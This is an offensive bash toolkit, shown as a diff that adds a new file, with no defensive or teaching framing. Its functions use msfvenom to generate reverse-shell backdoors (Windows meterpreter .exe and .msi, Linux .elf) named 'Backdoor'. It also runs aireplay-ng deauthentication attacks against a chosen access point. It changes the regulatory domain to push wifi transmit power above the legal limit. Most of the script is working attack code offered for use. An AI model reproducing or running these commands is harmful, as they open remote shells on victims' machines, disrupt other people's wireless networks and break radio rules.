@@ -1,0 +1,300 @@
+#!/bin/bash
+
+ipadd=$(ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1  -d'/')
+port=$(shuf -i 2000-65000 -n 1)
+port1=$port
+
+boostno(){
+ interface2=$(ifconfig | grep wlan | cut -f 1 -d ':')
+  if [[ "$interface2" == *mon* ]]; then
+  echo
+    echo
+    echo " ############## "
+    echo " #     Wifi   # "
+    echo " #    Restore # "
+    echo " ############## "
+    echo
+    echo
+    echo " Restoring interface $interface2"
+    ifconfig $interface2 down
+    sleep 1
+    iw reg set UK
+    sleep 1 
+    iwconfig $interface2 txpower 20 
+    sleep 1
+    ifconfig $interface2 up
+    sleep 1
+    echo
+    echo "Card Restored!, Tx-Power=20 dBm"
+    echo
+    iwconfig
+  else
+    echo
+    echo "No Monitor interface detected, check the card is in monitor mode!"
+    echo
+    exit
+  fi
+}
+
+boost(){
+  interface2=$(ifconfig | grep wlan | cut -f 1 -d ':')
+  if [[ "$interface2" == *mon* ]]; then
+    echo
+    echo
+    echo " ############## "
+    echo " #     Wifi   # "
+    echo " #    BOOSTA  # "
+    echo " ############## "
+    echo
+    echo
+    echo " Boosting interface $interface2"
+    ifconfig $interface2 down
+    sleep 1
+    iw reg set GY
+    sleep 1 
+    iwconfig $interface2 txpower 30 
+    sleep 1
+    ifconfig $interface2 up
+    sleep 1
+    echo
+    echo "Done: Card boosted!, Tx-Power=30 dBm"
+    echo
+    iwconfig
+  else
+    echo
+    echo "Aborted: No Monitor interface detected, check the card is in monitor mode!"
+    echo
+    exit
+  fi
+}
+
+airodumpstop(){
+  if ps -A | grep airodump-ng >>/dev/null; then
+    airodump-ng stop $interface >>/dev/null
+    sleep 1
+    echo "Airodump: Stopped successfully!"
+  else
+    echo "Airodump: No sessions detected!"
+    exit
+  fi
+}
+
+airodump(){
+  interface3=$(ifconfig | grep wlan | cut -f 1 -d ':')
+  if [[ "$interface3" == *mon* ]]; then
+    airodump-ng $interface3  
+    sleep 1
+  else
+    echo "Cant find card, Make sure card is in monitor mode!"
+    exit
+  fi
+}
+
+monrefresh(){
+ interface2=$(ifconfig | grep wlan | cut -f 1 -d ':')
+ if [[ "$interface2" == *mon* ]]; then 
+  echo "Stopping $interface2"
+  sleep 1
+  airmon-ng stop $interface2 >>/dev/null &&
+  sleep 1
+  service networking restart &&
+  service network-manager restart &&
+  sleep 5
+  echo
+  echo "$interface2: Succsessfully stopped"
+  echo
+  sleep 0.5 
+  iwconfig
+ else
+  echo "No cards detected running in monitor mode ?"
+  exit
+ fi 
+}
+
+monitor(){
+interface2=$(ifconfig | grep wlan | cut -f 1 -d ':')
+if [[ "$interface2" == *mon* ]]; then
+    echo "Card Already in Monitor mode!"
+    exit
+else 
+  echo
+  echo "Starting Monitor mode!!..."
+  echo
+  service networking restart &&
+  service network-manager restart &&
+  sleep 5
+  mon='mon'
+  interface=$(ifconfig | grep wlan | cut -f 1 -d ':')
+  sleep 1
+  echo
+  echo "Changing $interface to $interface$mon"
+  echo
+  airmon-ng check kill >/dev/null &&
+  sleep 1
+  airmon-ng start $interface >>/dev/null &&
+  sleep 1
+  if ifconfig | grep $interface$mon >>/dev/null; then
+    echo "$interface$mon: Started Succsessfully"
+    sleep 2
+    iwconfig
+    exit
+  else
+    echo "$interface$mon: Problem"
+    sleep 2
+    iwconfig 
+    echo
+  fi
+fi
+}
+
+snort(){
+  if tmux ls | grep Snort >>/dev/null; then
+    echo "Snort already Running"
+    exit
+  else
+    tmux new-ses -d -s Snort
+    sleep 2
+    tmux send-keys -t 'Snort' "snort -A fast" ENTER
+    echo "Tmux session: Snort has started"
+    echo
+    echo -n "Would you like to connect y/n?: "
+    read ans
+    echo
+    case $ans in
+       y)
+     tmux a -t Snort
+       ;;
+       n)
+     exit
+      ;;
+    esac
+  fi
+}
+
+snort_stop(){
+  if tmux ls | grep Snort >>/dev/null; then
+    tmux kill-ses -t Snort
+    sleep 1 
+    echo "Snort Session Stopped" 
+  else
+    echo "No Snort Session Found"
+  fi
+}
+
+exe(){
+  msfvenom -p windows/meterpreter/reverse_tcp -f exe -b '\x00\xff' lhost=$ipadd lport=$port1 -o ~/Desktop/Backdoor.exe >>/dev/null
+  echo
+  echo "Payload generated, Its waiting on the Desktop"
+  echo
+  echo "Listner set to port $port1"
+  echo
+
+}
+
+elf(){
+  msfvenom -p linux/x86/shell/reverse_tcp -f elf lhost=$ipadd lport=$port1 -o ~/Desktop/Backdoor.elf >>/dev/null
+  echo
+  echo "Payload generated, Its waiting on the Desktop"
+  echo
+  echo "Listner set to port $port1"
+  echo
+
+}
+
+
+msi(){
+  msfvenom -p windows/meterpreter/reverse_tcp -f msi -b '\x00\xff' lhost=$ipadd lport=$port1 -o ~/Desktop/Backdoor.msi >>/dev/null
+}
+
+function deauth {
+      interface2=$(ifconfig | grep wlan | cut -f 1 -d ':')
+      if [[ "$interface2" == *mon* ]]; then
+	echo
+	echo
+	echo
+	echo "$(tput setaf 1)$(tput bold)############"
+	echo "#          #"
+	echo "# DEAUTHER #"
+	echo "############"$(tput setaf sgr0)
+	echo
+	echo
+	echo
+	echo $(tput setaf 4)$(tput bold) "Hello $(hostname)"$(tput sgr0)
+	echo
+	echo
+	echo -n $(tput setaf 2)$(tput bold)"Bssid ?: "$(tput sgr0)
+	read bsi
+	echo
+	echo "$(tput setaf 1)$(tput bold)==>$(tput sgr0) $bsi"
+	echo
+	echo -n $(tput setaf 2)$(tput bold)"interface ?: "$(tput sgr0)
+	read int
+	echo
+	echo "$(tput setaf 1)$(tput bold)==>$(tput sgr0) $int"
+	echo
+	echo -n $(tput setaf 2)$(tput bold)"How long Seconds 0 = infinate ?: "$(tput sgr0)
+	read long
+	echo
+	echo "$(tput setaf 1)$(tput bold)==>$(tput sgr0) $long"
+	echo
+	aireplay-ng -0 $long -a $bsi $int
+        else
+        echo "$interface2 not in monitor mode!"
+        exit
+      fi
+}  
+
+restore(){
+  airmon-ng stop wlan0mon >>/dev/null
+  service networking restart >>/dev/null
+  service network-manager restart >>/dev/null
+  ifconfig wlan0 down && ifconfig wlan0 up
+  sleep 2
+  clear
+  echo
+  echo
+  echo "Services restored"
+  echo
+}
+
+case $1 in
+  exe)
+  exe
+  ;;
+  elf)
+  elf
+  ;;
+  msi)
+  msi
+  ;;
+  deauth)
+  deauth
+  ;;
+  restore)
+  restore
+  ;;
+  snort)
+  snort
+  ;;
+  snortstop)
+  snort_stop
+  ;;
+  monitor)
+  monitor
+  ;;
+  monitorstop)
+  monrefresh
+  ;;
+  airon)
+  airodump
+  ;;
+  airoff)
+  airodumpstop
+  ;;
+  boost)
+  boost
+  ;;
+  boostno)
+  boostno
+  ;;
+esac
